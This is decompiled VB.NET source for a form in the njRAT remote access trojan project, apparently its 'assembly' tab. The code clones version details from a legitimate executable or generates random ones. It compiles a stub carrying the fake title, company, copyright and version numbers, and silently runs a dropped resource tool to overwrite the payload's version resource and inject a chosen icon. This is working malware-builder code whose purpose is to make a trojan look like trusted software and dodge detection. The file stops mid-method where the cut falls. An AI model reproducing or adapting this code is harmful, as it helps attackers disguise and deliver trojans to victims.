Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000009 RID: 9
	<DesignerGenerated()>
	Public Partial Class Asemb
		Inherits Form

		' Token: 0x06000074 RID: 116 RVA: 0x000021BA File Offset: 0x000003BA
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Asemb_Load
			Asemb.__ENCAddToList(Me)
			Me.ico = New OpenFileDialog()
			Me.p = New OpenFileDialog()
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000075 RID: 117 RVA: 0x00006008 File Offset: 0x00004208
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Asemb.__ENCList
			SyncLock _ENCList
				If Asemb.__ENCList.Count = Asemb.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Asemb.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Asemb.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Asemb.__ENCList(num) = Asemb.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Asemb.__ENCList.RemoveRange(num, Asemb.__ENCList.Count - num)
					Asemb.__ENCList.Capacity = Asemb.__ENCList.Count
				End If
				Asemb.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700002D RID: 45
		' (get) Token: 0x06000078 RID: 120 RVA: 0x00007B2C File Offset: 0x00005D2C
		' (set) Token: 0x06000079 RID: 121 RVA: 0x00007B44 File Offset: 0x00005D44
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Dim value2 As EventHandler = AddressOf Me.FormSkin1_Click
				If Me._FormSkin1 IsNot Nothing Then
					RemoveHandler Me._FormSkin1.Click, value2
				End If
				Me._FormSkin1 = value
				If Me._FormSkin1 IsNot Nothing Then
					AddHandler Me._FormSkin1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x0600007A RID: 122 RVA: 0x00007B9C File Offset: 0x00005D9C
		' (set) Token: 0x0600007B RID: 123 RVA: 0x00007BB4 File Offset: 0x00005DB4
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_TextChanged
				If Me._TextBox1 IsNot Nothing Then
					RemoveHandler Me._TextBox1.TextChanged, value2
				End If
				Me._TextBox1 = value
				If Me._TextBox1 IsNot Nothing Then
					AddHandler Me._TextBox1.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x0600007C RID: 124 RVA: 0x00007C0C File Offset: 0x00005E0C
		' (set) Token: 0x0600007D RID: 125 RVA: 0x00007C24 File Offset: 0x00005E24
		Friend Overridable Property Button6 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button6_Click_1
				If Me._Button6 IsNot Nothing Then
					RemoveHandler Me._Button6.Click, value2
				End If
				Me._Button6 = value
				If Me._Button6 IsNot Nothing Then
					AddHandler Me._Button6.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x0600007E RID: 126 RVA: 0x00007C7C File Offset: 0x00005E7C
		' (set) Token: 0x0600007F RID: 127 RVA: 0x00007C94 File Offset: 0x00005E94
		Friend Overridable Property Button4 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button4_Click_1
				If Me._Button4 IsNot Nothing Then
					RemoveHandler Me._Button4.Click, value2
				End If
				Me._Button4 = value
				If Me._Button4 IsNot Nothing Then
					AddHandler Me._Button4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x06000080 RID: 128 RVA: 0x00007CEC File Offset: 0x00005EEC
		' (set) Token: 0x06000081 RID: 129 RVA: 0x00007D04 File Offset: 0x00005F04
		Friend Overridable Property Button3 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button3_Click_1
				If Me._Button3 IsNot Nothing Then
					RemoveHandler Me._Button3.Click, value2
				End If
				Me._Button3 = value
				If Me._Button3 IsNot Nothing Then
					AddHandler Me._Button3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x06000082 RID: 130 RVA: 0x00007D5C File Offset: 0x00005F5C
		' (set) Token: 0x06000083 RID: 131 RVA: 0x00007D74 File Offset: 0x00005F74
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click_1
				If Me._Button2 IsNot Nothing Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				If Me._Button2 IsNot Nothing Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x06000084 RID: 132 RVA: 0x00007DCC File Offset: 0x00005FCC
		' (set) Token: 0x06000085 RID: 133 RVA: 0x000021F7 File Offset: 0x000003F7
		Friend Overridable Property Label8 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label8 = value
			End Set
		End Property

		' Token: 0x17000034 RID: 52
		' (get) Token: 0x06000086 RID: 134 RVA: 0x00007DE4 File Offset: 0x00005FE4
		' (set) Token: 0x06000087 RID: 135 RVA: 0x00002200 File Offset: 0x00000400
		Friend Overridable Property Label7 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label7 = value
			End Set
		End Property

		' Token: 0x17000035 RID: 53
		' (get) Token: 0x06000088 RID: 136 RVA: 0x00007DFC File Offset: 0x00005FFC
		' (set) Token: 0x06000089 RID: 137 RVA: 0x00002209 File Offset: 0x00000409
		Friend Overridable Property N9 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N9 = value
			End Set
		End Property

		' Token: 0x17000036 RID: 54
		' (get) Token: 0x0600008A RID: 138 RVA: 0x00007E14 File Offset: 0x00006014
		' (set) Token: 0x0600008B RID: 139 RVA: 0x00002212 File Offset: 0x00000412
		Friend Overridable Property N8 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N8 = value
			End Set
		End Property

		' Token: 0x17000037 RID: 55
		' (get) Token: 0x0600008C RID: 140 RVA: 0x00007E2C File Offset: 0x0000602C
		' (set) Token: 0x0600008D RID: 141 RVA: 0x0000221B File Offset: 0x0000041B
		Friend Overridable Property N7 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N7 = value
			End Set
		End Property

		' Token: 0x17000038 RID: 56
		' (get) Token: 0x0600008E RID: 142 RVA: 0x00007E44 File Offset: 0x00006044
		' (set) Token: 0x0600008F RID: 143 RVA: 0x00002224 File Offset: 0x00000424
		Friend Overridable Property N6 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N6 = value
			End Set
		End Property

		' Token: 0x17000039 RID: 57
		' (get) Token: 0x06000090 RID: 144 RVA: 0x00007E5C File Offset: 0x0000605C
		' (set) Token: 0x06000091 RID: 145 RVA: 0x0000222D File Offset: 0x0000042D
		Friend Overridable Property N4 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N4 = value
			End Set
		End Property

		' Token: 0x1700003A RID: 58
		' (get) Token: 0x06000092 RID: 146 RVA: 0x00007E74 File Offset: 0x00006074
		' (set) Token: 0x06000093 RID: 147 RVA: 0x00002236 File Offset: 0x00000436
		Friend Overridable Property N3 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N3 = value
			End Set
		End Property

		' Token: 0x1700003B RID: 59
		' (get) Token: 0x06000094 RID: 148 RVA: 0x00007E8C File Offset: 0x0000608C
		' (set) Token: 0x06000095 RID: 149 RVA: 0x0000223F File Offset: 0x0000043F
		Friend Overridable Property N2 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N2 = value
			End Set
		End Property

		' Token: 0x1700003C RID: 60
		' (get) Token: 0x06000096 RID: 150 RVA: 0x00007EA4 File Offset: 0x000060A4
		' (set) Token: 0x06000097 RID: 151 RVA: 0x00002248 File Offset: 0x00000448
		Friend Overridable Property N1 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._N1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._N1 = value
			End Set
		End Property

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x06000098 RID: 152 RVA: 0x00007EBC File Offset: 0x000060BC
		' (set) Token: 0x06000099 RID: 153 RVA: 0x00002251 File Offset: 0x00000451
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x0600009A RID: 154 RVA: 0x00007ED4 File Offset: 0x000060D4
		' (set) Token: 0x0600009B RID: 155 RVA: 0x0000225A File Offset: 0x0000045A
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x0600009C RID: 156 RVA: 0x00007EEC File Offset: 0x000060EC
		' (set) Token: 0x0600009D RID: 157 RVA: 0x00002263 File Offset: 0x00000463
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x0600009E RID: 158 RVA: 0x00007F04 File Offset: 0x00006104
		' (set) Token: 0x0600009F RID: 159 RVA: 0x0000226C File Offset: 0x0000046C
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x060000A0 RID: 160 RVA: 0x00007F1C File Offset: 0x0000611C
		' (set) Token: 0x060000A1 RID: 161 RVA: 0x00002275 File Offset: 0x00000475
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x060000A2 RID: 162 RVA: 0x00007F34 File Offset: 0x00006134
		' (set) Token: 0x060000A3 RID: 163 RVA: 0x00007F4C File Offset: 0x0000614C
		Friend Overridable Property T5 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.T5_TextChanged
				If Me._T5 IsNot Nothing Then
					RemoveHandler Me._T5.TextChanged, value2
				End If
				Me._T5 = value
				If Me._T5 IsNot Nothing Then
					AddHandler Me._T5.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x060000A4 RID: 164 RVA: 0x00007FA4 File Offset: 0x000061A4
		' (set) Token: 0x060000A5 RID: 165 RVA: 0x00007FBC File Offset: 0x000061BC
		Friend Overridable Property T4 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.T4_TextChanged
				If Me._T4 IsNot Nothing Then
					RemoveHandler Me._T4.TextChanged, value2
				End If
				Me._T4 = value
				If Me._T4 IsNot Nothing Then
					AddHandler Me._T4.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x060000A6 RID: 166 RVA: 0x00008014 File Offset: 0x00006214
		' (set) Token: 0x060000A7 RID: 167 RVA: 0x0000802C File Offset: 0x0000622C
		Friend Overridable Property T3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.T3_TextChanged
				If Me._T3 IsNot Nothing Then
					RemoveHandler Me._T3.TextChanged, value2
				End If
				Me._T3 = value
				If Me._T3 IsNot Nothing Then
					AddHandler Me._T3.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x060000A8 RID: 168 RVA: 0x00008084 File Offset: 0x00006284
		' (set) Token: 0x060000A9 RID: 169 RVA: 0x0000809C File Offset: 0x0000629C
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.T2_TextChanged
				If Me._T2 IsNot Nothing Then
					RemoveHandler Me._T2.TextChanged, value2
				End If
				Me._T2 = value
				If Me._T2 IsNot Nothing Then
					AddHandler Me._T2.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x060000AA RID: 170 RVA: 0x000080F4 File Offset: 0x000062F4
		' (set) Token: 0x060000AB RID: 171 RVA: 0x0000810C File Offset: 0x0000630C
		Friend Overridable Property T1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.T1_TextChanged
				If Me._T1 IsNot Nothing Then
					RemoveHandler Me._T1.TextChanged, value2
				End If
				Me._T1 = value
				If Me._T1 IsNot Nothing Then
					AddHandler Me._T1.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x060000AC RID: 172 RVA: 0x00008164 File Offset: 0x00006364
		' (set) Token: 0x060000AD RID: 173 RVA: 0x0000817C File Offset: 0x0000637C
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click_1
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x060000AE RID: 174 RVA: 0x000081D4 File Offset: 0x000063D4
		' (set) Token: 0x060000AF RID: 175 RVA: 0x000081EC File Offset: 0x000063EC
		Friend Overridable Property TXTFilename As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TXTFilename
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TXTFilename_TextChanged
				If Me._TXTFilename IsNot Nothing Then
					RemoveHandler Me._TXTFilename.TextChanged, value2
				End If
				Me._TXTFilename = value
				If Me._TXTFilename IsNot Nothing Then
					AddHandler Me._TXTFilename.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x060000B0 RID: 176 RVA: 0x00008244 File Offset: 0x00006444
		' (set) Token: 0x060000B1 RID: 177 RVA: 0x0000227E File Offset: 0x0000047E
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x060000B2 RID: 178 RVA: 0x0000825C File Offset: 0x0000645C
		' (set) Token: 0x060000B3 RID: 179 RVA: 0x00008274 File Offset: 0x00006474
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x060000B4 RID: 180 RVA: 0x000082CC File Offset: 0x000064CC
		' (set) Token: 0x060000B5 RID: 181 RVA: 0x00002287 File Offset: 0x00000487
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x060000B6 RID: 182 RVA: 0x000082E4 File Offset: 0x000064E4
		' (set) Token: 0x060000B7 RID: 183 RVA: 0x00002290 File Offset: 0x00000490
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x060000B8 RID: 184 RVA: 0x000082FC File Offset: 0x000064FC
		Public Function RandomN() As Object
			VBMath.Randomize()
			Dim num As Single = Conversion.Int(9F * VBMath.Rnd()) + 1F
			Return num
		End Function

		' Token: 0x060000B9 RID: 185 RVA: 0x00008330 File Offset: 0x00006530
		Public Function GENRandom(longitud As Integer, NNNNN As Integer) As String
			Dim text As String = "012345678WERTYUIQWERTYUIWPL123456789KJHGFDSAZXC123456789VBNMQWERTY9QWERTYUIQWERTYUIOPLKJHGF123456789DSAZXCVBNMQWERTYUIOPLKJH123456789GFDSAZXCVBNMQWERTYUI123456789OPLKJHGFDSAYUIOPLKJHGFDSAZX123456789123456789123456789CVBNMOPLKJHGFDSAZXCVBNM"
			Dim random As Random = New Random()
			Dim stringBuilder As StringBuilder = New StringBuilder()
			For i As Integer = 1 To longitud
				Dim startIndex As Integer = random.[Next](0, NNNNN)
				stringBuilder.Append(text.Substring(startIndex, 1))
			Next
			Return stringBuilder.ToString()
		End Function

		' Token: 0x060000BA RID: 186 RVA: 0x0000838C File Offset: 0x0000658C
		Private Sub Display_Description(Name As String)
			If Operators.CompareString(Me.TXTFilename.Text, Nothing, False) = 0 Or Not File.Exists(Me.TXTFilename.Text) Then
				Interaction.MsgBox("Select a file", MsgBoxStyle.Information, Nothing)
				Me.Close()
			Else
				Try
					Application.DoEvents()
					If File.Exists(Application.StartupPath + "\res.exe") Then
						File.Delete(Application.StartupPath + "\res.exe")
					End If
					Thread.Sleep(100)
					File.WriteAllBytes(Application.StartupPath + "\res.exe", Resources.Res)
					Dim text As String = Resources.RHDiscription
					Dim vbcodeProvider As VBCodeProvider = New VBCodeProvider(New Dictionary(Of String, String)() From { { "CompilerVersion", "v2.0" } })
					Dim compilerParameters As CompilerParameters = New CompilerParameters()
					Dim compilerParameters2 As CompilerParameters = compilerParameters
					compilerParameters2.GenerateExecutable = True
					compilerParameters2.OutputAssembly = Application.StartupPath + "\" + Me.T1.Text + ".exe"
					compilerParameters2.CompilerOptions = "/target:winexe"
					compilerParameters2.ReferencedAssemblies.Add("System.dll")
					compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll")
					compilerParameters2.MainClass = "X"
					Thread.Sleep(100)
					text = text.Replace("*Title*", Me.T2.Text)
					text = text.Replace("*Company*", Me.T3.Text)
					text = text.Replace("*Product*", Me.T4.Text)
					text = text.Replace("*Copyright*", Me.T5.Text)
					text = text.Replace("*Trademark*", Me.T1.Text)
					text = text.Replace("*version*", String.Concat(New String() { Me.N1.Value.ToString(), ".", Me.N2.Value.ToString(), ".", Me.N3.Value.ToString(), ".", Me.N4.Value.ToString() }))
					text = text.Replace("*fversion*", String.Concat(New String() { Me.N6.Value.ToString(), ".", Me.N7.Value.ToString(), ".", Me.N8.Value.ToString(), ".", Me.N9.Value.ToString() }))
					vbcodeProvider.CompileAssemblyFromSource(compilerParameters, New String() { text })
					Thread.Sleep(100)
					Dim text2 As String = Application.StartupPath + "\" + Me.T1.Text + ".exe"
					Dim text3 As String = Application.StartupPath + "\" + Me.T1.Text + ".res"
					Thread.Sleep(100)
					Interaction.Shell(String.Concat(New String() { "res.exe -extract ", text2, ",", text3, ",VERSIONINFO,," }), AppWinStyle.Hide, True, -1)
					Interaction.Shell(String.Concat(New String() { "res.exe -delete ", Name, ",", AppDomain.CurrentDomain.BaseDirectory, "res.exe,VERSIONINFO,," }), AppWinStyle.Hide, True, -1)
					Interaction.Shell(String.Concat(New String() { "res.exe -addoverwrite ", Name, ",", Name, ",", text3, ",VERSIONINFO,1," }), AppWinStyle.Hide, True, -1)
					Thread.Sleep(100)
					If File.Exists(Application.StartupPath + "\" + Me.T1.Text + ".exe") Then
						File.Delete(Application.StartupPath + "\" + Me.T1.Text + ".exe")
					End If
					If File.Exists(Application.StartupPath + "\" + Me.T1.Text + ".res") Then
						File.Delete(Application.StartupPath + "\" + Me.T1.Text + ".res")
					End If
					If File.Exists(Application.StartupPath + "\res.exe") Then
						File.Delete(Application.StartupPath + "\res.exe")
					End If
					If File.Exists(Application.StartupPath + "\res.log") Then
						File.Delete(Application.StartupPath + "\res.log")
					End If
					If File.Exists(Application.StartupPath + "\res.ini") Then
						File.Delete(Application.StartupPath + "\res.ini")
						Thread.Sleep(100)
					End If
					IconInjector.InjectIcon(Me.p.FileName, Me.ico.FileName)
				Catch ex As Exception
				End Try
			End If
			Me.Close()
		End Sub

		' Token: 0x060000BB RID: 187 RVA: 0x00008928 File Offset: 0x00006B28
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Me.T1.Text = Me.GENRandom(12, 55)
			Me.T2.Text = Me.GENRandom(5, 44)
			Me.T3.Text = Me.GENRandom(12, 50)
			Me.T4.Text = Me.GENRandom(12, 88)
			Me.T5.Text = Me.GENRandom(12, 93)
			Me.N1.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N2.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N3.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N4.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N6.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N7.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N8.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N9.Value = Conversions.ToDecimal(Me.RandomN())
		End Sub

		' Token: 0x060000BC RID: 188 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Asemb_Load(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000BD RID: 189 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub TXTFilename_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000BE RID: 190 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub T1_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000BF RID: 191 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub T2_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C0 RID: 192 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub T3_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C1 RID: 193 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub T4_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C2 RID: 194 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub T5_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C3 RID: 195 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C4 RID: 196 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub FormSkin1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C5 RID: 197 RVA: 0x00008A50 File Offset: 0x00006C50
		Private Sub Button3_Click_1(sender As Object, e As EventArgs)
			Try
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "(.exe) |*.exe" }
				openFileDialog.ShowDialog()
				If openFileDialog.FileName.Length > 0 Then
					Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName)
					Me.T1.Text = Path.GetFileNameWithoutExtension(openFileDialog.FileName)
					Me.T2.Text = versionInfo.FileDescription
					Me.T3.Text = versionInfo.CompanyName
					Me.T4.Text = versionInfo.ProductName
					Me.T5.Text = versionInfo.LegalCopyright
					Dim array As String() = versionInfo.ProductVersion.Split(New Char() { "."c })
					Me.N1.Value = Conversions.ToDecimal(array(0))
					Me.N2.Value = Conversions.ToDecimal(array(1))
					Me.N3.Value = Conversions.ToDecimal(array(2))
					Me.N4.Value = Conversions.ToDecimal(array(3))
					Dim array2 As String() = versionInfo.FileVersion.Split(New Char() { "."c })
					Me.N6.Value = Conversions.ToDecimal(array2(0))
					Me.N7.Value = Conversions.ToDecimal(array2(1))
					Me.N8.Value = Conversions.ToDecimal(array2(2))
					Me.N9.Value = Conversions.ToDecimal(array2(3))
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000C6 RID: 198 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x060000C7 RID: 199 RVA: 0x00008BF0 File Offset: 0x00006DF0
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
			Me.p.Filter = "Executable|*.exe"
			Me.p.Title = "Open"
			If Me.p.ShowDialog() = DialogResult.OK Then
				Me.TXTFilename.Text = Me.p.FileName
			End If
		End Sub

		' Token: 0x060000C8 RID: 200 RVA: 0x00008C44 File Offset: 0x00006E44
		Private Sub Button6_Click_1(sender As Object, e As EventArgs)
			Me.ico.Filter = "Ico|*.ico"
			Me.ico.Title = "Ico"
			Me.ico.ShowDialog()
			Me.TextBox1.Text = Me.ico.FileName
		End Sub

		' Token: 0x060000C9 RID: 201 RVA: 0x00002299 File Offset: 0x00000499
		Private Sub Button4_Click_1(sender As Object, e As EventArgs)
			Me.Display_Description(Me.TXTFilename.Text)
		End Sub

		' Token: 0x060000CA RID: 202 RVA: 0x00008928 File Offset: 0x00006B28
		Private Sub Button2_Click_1(sender As Object, e As EventArgs)
